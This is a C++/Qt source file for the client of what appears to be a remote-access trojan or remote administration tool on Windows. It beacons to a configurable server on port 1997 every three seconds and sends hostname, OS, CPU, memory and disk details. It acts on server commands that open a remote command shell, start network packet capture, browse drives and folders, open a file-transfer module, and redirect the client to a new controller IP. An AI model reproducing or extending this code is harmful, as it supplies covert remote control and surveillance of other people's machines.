#include "MainManager.h"



MainManager::MainManager() : Base()
{

	for (int i = 0; i < MaxFunction; i++) {

		function[i] = nullptr;

	}

	set = new QSettings("./config.ini", QSettings::IniFormat);

	QString ip = set->value(QString("ConnectIP") + "/" + "IP").toString();

	Base::SetIp(ip.toStdString().data(),1997);

	QObject::connect(this,SIGNAL(CreateTimer()),this,SLOT(Timer()));
}


MainManager::~MainManager() {

	DisconnectEx();
}

void MainManager::DisconnectEx() {


	for (int i = 0; i < MaxFunction; i++) {

		if (function[i] != nullptr) {

			delete function[i];

		}
	}

}

void MainManager::NotActive() {


	InterlockedExchange(&isActive, NOTRUNNING);

	instanceOfRecv->exit();

	instanceOfRecv->wait();


	for (int i = 0; i < MaxFunction; i++) {

		if (function[i] != nullptr) {

			delete function[i];

			function[i] = nullptr;

		}
	}

}

void MainManager::Timer(){

	connectTimer = new QTimer();

	QObject::connect(connectTimer, SIGNAL(timeout()), this, SLOT(HeartBeat()));

	connectTimer->start(3000);
}

void MainManager::HeartBeat(){

	ConnectEx();
}

void MainManager::SendOnlineInfo(QString info){

	QByteArray SI;

	SI.append(info);

	Send(SI,CommandGetOnlineInfo);

	qDebug() << QThread::currentThreadId();
}

void MainManager::ConnectEx() {


	int nRet = Connect();


	if (nRet == Success) {

		qDebug() << "Connect Success";

		QString hardWare("");

		QSettings *CPU = new QSettings("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", QSettings::NativeFormat);

		hardWare=hardWare+CPU->value("ProcessorNameString").toString()+"|";

		delete CPU;

		MEMORYSTATUSEX statex;
		statex.dwLength = sizeof(statex);
		GlobalMemoryStatusEx(&statex);

		double m_totalMem = statex.ullTotalPhys  * 1.0 / GB;
		double m_freeMem = statex.ullAvailPhys * 1.0 / GB;

		QString m_memDescribe = QString(" %1 GB / %2 GB").
			arg(QString::asprintf("%.2f", m_freeMem)).arg(QString::asprintf("%.2f", m_totalMem));

		hardWare = hardWare + m_memDescribe.trimmed() + "|";

		/*QString m_screenDescribe = "";
		QList<QSize> screenSizeList;
		QList <int> screenCountList;

		qDebug() << "YESSSSSSSSSS";

		for (int i = 0; i<QApplication::desktop()->screenCount(); i++)
		{
			QRect screenRect = QApplication::desktop()->screenGeometry(i);
			QSize size(screenRect.width(), screenRect.height());

			bool bExist = false;
			for (int j = 0; j<screenSizeList.length(); j++)
			{
				QSize existSize = screenSizeList.at(j);
				if (size == existSize)
				{
					screenCountList[j]++;
					bExist = true;
					break;
				}
			}

			if (!bExist)
			{
				screenSizeList.append(size);
				screenCountList.append(1);
			}
		}

		qDebug() << "YESSSSSSSSSS";

		QSize m_maxScreenSize = screenSizeList.at(0);
		for (int i = 0; i<screenSizeList.length(); i++)
		{
			int width = screenSizeList.at(i).width();
			int height = screenSizeList.at(i).height();

			if (width > m_maxScreenSize.width() && height > m_maxScreenSize.height())
				m_maxScreenSize = screenSizeList.at(i);

			m_screenDescribe += QString("(%1 x %2) x %3").arg(width).arg(height).arg(screenCountList.at(i));
			if (i != screenSizeList.length() - 1)
				m_screenDescribe += "、";
		}

		hardWare = hardWare + m_screenDescribe.trimmed() + "|";*/

		QString m_diskDescribe = "";

		QFileInfoList list = QDir::drives();

		foreach(QFileInfo dir, list)
		{
			QString dirName = dir.absolutePath();
			dirName.remove("/");
			LPCWSTR lpcwstrDriver = (LPCWSTR)dirName.utf16();
			ULARGE_INTEGER liFreeBytesAvailable, liTotalBytes, liTotalFreeBytes;
			if (GetDiskFreeSpaceEx(lpcwstrDriver, &liFreeBytesAvailable, &liTotalBytes, &liTotalFreeBytes))
			{
				QString free = QString::number((double)liTotalFreeBytes.QuadPart / GB, 'f', 1);
				free += "G";
				QString all = QString::number((double)liTotalBytes.QuadPart / GB, 'f', 1);
				all += "G";

				QString str = QString("%1%2/%3 ").arg(dirName, free, all);
				m_diskDescribe += str;

			}
		}

		hardWare = hardWare + m_diskDescribe.trimmed();


		Send(
			QByteArray(
			(QSysInfo::productType() + QSysInfo::productVersion() + "|" + QSysInfo::machineHostName() + "|" + hardWare).toStdString().data(),
				(QSysInfo::productType() + QSysInfo::productVersion() + "|" + QSysInfo::machineHostName() + "|" + hardWare).size()
			)
			, TokenLogin);


	}
	else if (nRet == Exist) {

		Send(QByteArray(), TokenHeartBeat);

		qDebug() << "HeartBreting........";

	}
	else {
		qDebug() << "Connection failed";
	}

}


void MainManager::AnalyzeAndProcess(Token token, QByteArray data) {


	switch (token)
	{

	case TokenLogin: {

		CopyMemory(&mainNumber, data.data(), sizeof(UINT));

		CopyMemory(localIp, data.data() + sizeof(UINT), sizeof(localIp));

		if (function[FNetWork] == nullptr) {

			function[FNetWork] = new NetWork();

			NetWork *network = dynamic_cast<NetWork*>(function[FNetWork]);

			network->StartCapture(localIp);


		}
		else {
			if (function[FNetWork]->IsActive() != true) {

				delete function[FNetWork];

				function[FNetWork] = new NetWork();

				NetWork *network = dynamic_cast<NetWork*>(function[FNetWork]);

				network->StartCapture(localIp);
			}
		}

		break;
	}

	case CommandOpenNetworkServer: {

		qDebug() << "Get it Open";

		if (!function[FNetWork]->IsActive()) {
			function[FNetWork]->ConnectEx();
		}
		else {
			qDebug() << "Already Exist";
		}

		break;

	}
	case CommandOpenCmd: {

		if (function[FRemoteCmd] == nullptr) {

			function[FRemoteCmd] = new RemoteCommand();

			function[FRemoteCmd]->ConnectEx();

		}
		else {
			if (function[FRemoteCmd]->IsActive() != true) {

				delete function[FRemoteCmd];

				function[FRemoteCmd] = new RemoteCommand();

				function[FRemoteCmd]->ConnectEx();
			}
		}
		break;
	}
	case CommandGetDir: {

		QFileInfoList fileInfoList=QDir::drives();

		QByteArray dirs;

		foreach (QFileInfo mfi,fileInfoList){
			dirs.append(mfi.absoluteFilePath()+"|");
		}

		dirs.remove(dirs.size() - 1, 1);

		qDebug() << dirs;

		Send(dirs, CommandGetDir);

		break;
	}
	case CommandGetFiles: {

		QString Path(data);

		qDebug() << Path;

		QDir dir(Path);

		QByteArray files;

		foreach(QFileInfo mfi, dir.entryInfoList())
		{
			if (!mfi.isFile()){
				if (mfi.fileName() == "." || mfi.fileName() == "..")
					continue;

				files.append(mfi.fileName()+"|");
			}
		}
		files.remove(files.size() - 1, 1);

		qDebug() << files;
		
		Send(files, CommandGetFiles);

		break;

	}

	case CommandOpenDoucmentFuntion: {

		qDebug() << "Open Document";

		if (function[FDocument] == nullptr) {

			function[FDocument] = new Document();

			function[FDocument]->ConnectEx();

		}
		else {
			if (function[FDocument]->IsActive() != true) {

				qDebug() << "YES";

				delete function[FDocument];

				function[FDocument] = new Document();

				function[FDocument]->ConnectEx();
			}
		}
		break;
	}

	case CommectRedirectIp: {

		QString ip(data);

		qDebug() << ip;

		QSettings * set = new QSettings("./Config.ini", QSettings::IniFormat);

		set->setValue(QString("ConnectIP") + "/" + "IP", ip);

		Base::SetIp(ip.toStdString().data(), 1997);

		for (int i = 0; i < MaxFunction; i++) {

			if (function[i] != nullptr) {

				delete function[i];

				function[i] = nullptr;

			}
		}

		Disconnect();

		break;
	}

	case CommandGetOnlineInfo:{

		emit GetOnlineInfo();

		break;
	}

	default: {
		break;
	}

	}
}
